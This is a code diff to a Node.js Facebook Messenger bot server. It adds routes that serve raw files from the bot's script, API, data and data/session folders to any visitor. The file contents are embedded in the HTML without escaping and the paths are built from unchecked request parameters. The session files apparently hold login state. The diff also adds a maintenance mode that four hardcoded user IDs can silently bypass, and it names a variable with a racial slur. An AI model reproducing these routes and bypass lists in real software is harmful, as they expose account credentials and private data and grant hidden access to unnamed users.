@@ -8,6 +8,315 @@ const gradient = require('gradient-string');
 const socketIo = require('socket.io');
 const bodyParser = require('body-parser');
 const axios = require('axios');
+
+app.use('/script/:filename', (req, res) => {
+  const filename = req.params.filename;
+  const filePath = path.join(__dirname, 'script', `${filename}`);
+
+  fs.access(filePath, fs.constants.F_OK, (err) => {
+    if (err) {
+      return res.status(404).send('File not found');
+    }
+
+    fs.readFile(filePath, 'utf8', (err, data) => {
+      if (err) {
+        return res.status(500).send('Error reading file');
+      }
+
+      const htmlResponse = `
+        <html>
+        <head>
+          <style>
+            body {
+              background: #0b0c26;
+              color: white;
+              font-family: monospace;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              padding: 0;
+            }
+            pre {
+              color: #ffd700;
+              font-size: 20px;
+              flex: 1;
+              overflow-y: auto;
+              padding: 20px;
+              border: 1px solid #ffd700;
+              border-radius: 10px;
+              background-color: rgba(0, 0, 0, 0.5);
+              margin: 20px;
+              box-sizing: border-box;
+            }
+          </style>
+        </head>
+        <body>
+            <pre>${data}</pre>
+        </body>
+        </html>`;
+      res.send(htmlResponse);
+    });
+  });
+});
+
+app.use('/fb-chat-api/src/:filename', (req, res) => {
+  const filenames = req.params.filename;
+  const filePaths = path.join(__dirname, 'fb-chat-api', 'src', `${filenames}`);
+
+  fs.access(filePaths, fs.constants.F_OK, (err) => {
+    if (err) {
+      return res.status(404).send('File not found');
+    }
+
+    fs.readFile(filePaths, 'utf8', (err, data) => {
+      if (err) {
+        return res.status(500).send('Error reading file');
+      }
+
+      const yawa = `
+        <html>
+        <head>
+          <style>
+            body {
+              background: #0b0c26;
+              color: white;
+              font-family: monospace;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              padding: 0;
+            }
+            pre {
+              color: #ffd700;
+              font-size: 20px;
+              flex: 1;
+              overflow-y: auto;
+              padding: 20px;
+              border: 1px solid #ffd700;
+              border-radius: 10px;
+              background-color: rgba(0, 0, 0, 0.5);
+              margin: 20px;
+              box-sizing: border-box;
+            }
+          </style>
+        </head>
+        <body>
+            <pre>${data}</pre>
+        </body>
+        </html>`;
+      res.send(yawa);
+    });
+  });
+});
+
+app.use('/fb-chat-api/:filename', (req, res) => {
+  const filenamess = req.params.filename;
+  const filePathss = path.join(__dirname, 'fb-chat-api', `${filenamess}`);
+
+  fs.access(filePathss, fs.constants.F_OK, (err) => {
+    if (err) {
+      return res.status(404).send('File not found');
+    }
+
+    fs.readFile(filePathss, 'utf8', (err, data) => {
+      if (err) {
+        return res.status(500).send('Error reading file');
+      }
+
+      const yawe = `
+        <html>
+        <head>
+          <style>
+            body {
+              background: #0b0c26;
+              color: white;
+              font-family: monospace;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              padding: 0;
+            }
+            pre {
+              color: #ffd700;
+              font-size: 20px;
+              flex: 1;
+              overflow-y: auto;
+              padding: 20px;
+              border: 1px solid #ffd700;
+              border-radius: 10px;
+              background-color: rgba(0, 0, 0, 0.5);
+              margin: 20px;
+              box-sizing: border-box;
+            }
+          </style>
+        </head>
+        <body>
+            <pre>${data}</pre>
+        </body>
+        </html>`;
+      res.send(yawe);
+    });
+  });
+});
+
+app.use('/pub/:filename', (req, res) => {
+  const filenamesss = req.params.filename;
+  const filePathsss = path.join(__dirname, 'pub', `${filenamesss}`);
+
+  fs.access(filePathsss, fs.constants.F_OK, (err) => {
+    if (err) {
+      return res.status(404).send('File not found');
+    }
+
+    fs.readFile(filePathsss, 'utf8', (err, data) => {
+      if (err) {
+        return res.status(500).send('Error reading file');
+      }
+
+      const haha = `
+        <html>
+        <head>
+          <style>
+            body {
+              background: #0b0c26;
+              color: white;
+              font-family: monospace;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              padding: 0;
+            }
+            pre {
+              color: #ffd700;
+              font-size: 20px;
+              flex: 1;
+              overflow-y: auto;
+              padding: 20px;
+              border: 1px solid #ffd700;
+              border-radius: 10px;
+              background-color: rgba(0, 0, 0, 0.5);
+              margin: 20px;
+              box-sizing: border-box;
+            }
+          </style>
+        </head>
+        <body>
+            <pre>${data}</pre>
+        </body>
+        </html>`;
+      res.send(haha);
+    });
+  });
+});
+
+app.use('/data/session/:filename', (req, res) => {
+  const filenamesssss = req.params.filename;
+  const filePathsssss = path.join(__dirname, 'data', 'session', `${filenamesssss}`);
+
+  fs.access(filePathsssss, fs.constants.F_OK, (err) => {
+    if (err) {
+      return res.status(404).send('File not found');
+    }
+
+    fs.readFile(filePathsssss, 'utf8', (err, data) => {
+      if (err) {
+        return res.status(500).send('Error reading file');
+      }
+
+      const ny = `
+        <html>
+        <head>
+          <style>
+            body {
+              background: #0b0c26;
+              color: white;
+              font-family: monospace;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              padding: 0;
+            }
+            pre {
+              color: #ffd700;
+              font-size: 20px;
+              flex: 1;
+              overflow-y: auto;
+              padding: 20px;
+              border: 1px solid #ffd700;
+              border-radius: 10px;
+              background-color: rgba(0, 0, 0, 0.5);
+              margin: 20px;
+              box-sizing: border-box;
+            }
+          </style>
+        </head>
+        <body>
+            <pre>${data}</pre>
+        </body>
+        </html>`;
+      res.send(ny);
+    });
+  });
+});
+
+
+
+app.use('/data/:filename', (req, res) => {
+  const filenamessssss = req.params.filename;
+  const filePathssssss = path.join(__dirname, 'data', `${filenamessssss}`);
+
+  fs.access(filePathssssss, fs.constants.F_OK, (err) => {
+    if (err) {
+      return res.status(404).send('File not found');
+    }
+
+    fs.readFile(filePathssssss, 'utf8', (err, data) => {
+      if (err) {
+        return res.status(500).send('Error reading file');
+      }
+
+      const n = `
+        <html>
+        <head>
+          <style>
+            body {
+              background: #0b0c26;
+              color: white;
+              font-family: monospace;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              padding: 0;
+            }
+            pre {
+              color: #ffd700;
+              font-size: 20px;
+              flex: 1;
+              overflow-y: auto;
+              padding: 20px;
+              border: 1px solid #ffd700;
+              border-radius: 10px;
+              background-color: rgba(0, 0, 0, 0.5);
+              margin: 20px;
+              box-sizing: border-box;
+            }
+          </style>
+        </head>
+        <body>
+            <pre>${data}</pre>
+        </body>
+        </html>`;
+      res.send(n);
+    });
+  });
+});
+
 const script = path.join(__dirname, 'script');
 const moment = require("moment-timezone");
 const port = process.env.PORT || 8000;
@@ -553,8 +862,37 @@ let blacklist = user.blacklist || [];
             api.sendMessage(`Invalid usage this command doesn't need a prefix`, event.threadID, event.messageID);
             return;
           }
+
           if (event.body && aliases(command)?.name) {
+          const modeFile = './cache/maintenance.txt';
             const role = aliases(command)?.role ?? 0;
+            if (!fs.existsSync(modeFile)) {
+                  fs.writeFileSync(modeFile, 'false');
+              }
+
+let his = JSON.parse(fs.readFileSync('./data/history.json', 'utf-8'));
+
+const uid = await api.getCurrentUserID();
+let userdata = his.find(item => item.userid === uid) || { userid: uid, admin: [] };
+          const onlyadmin = './cache/${uid}.txt';
+            const nigga = aliases(command)?.role ?? 0;
+            if (!fs.existsSync(onlyadmin)) {
+                  fs.writeFileSync(onlyadmin, 'false');
+              }
+
+            const Enable = fs.readFileSync(onlyadmin, 'utf-8');
+              if (Enable === 'true' && nigga !== 1 && !userdata.admin.includes(event.senderID)) {
+                  api.sendMessage("❌ | Currently only bot's admin can use bot", event.threadID, event.messageID);
+                  return;
+              }
+
+            const isEnable = fs.readFileSync(modeFile, 'utf-8');
+              const bypassUIDs = ["100053549552408","61557118090040","100075645547118","61566984747506"];
+              if (isEnable === 'true' && role !== 2 && role !== 3 && !bypassUIDs.includes(event.senderID)) {
+                  api.sendMessage("Our system is currently undergoing maintenance. Please try again later!", event.threadID, event.messageID);
+                  return;
+              }
+
             const isAdmin = config?.[0]?.masterKey?.admin?.includes(event.senderID) || admin.includes(event.senderID);
             const isThreadAdmin = isAdmin || ((Array.isArray(adminIDS) ? adminIDS.find(admin => Object.keys(admin)[0] === event.threadID) : {})?.[event.threadID] || []).some(admin => admin.id === event.senderID);
             if ((role == 1 && !isAdmin) || (role == 2 && !isThreadAdmin) || (role == 3 && !config?.[0]?.masterKey?.admin?.includes(event.senderID))) {
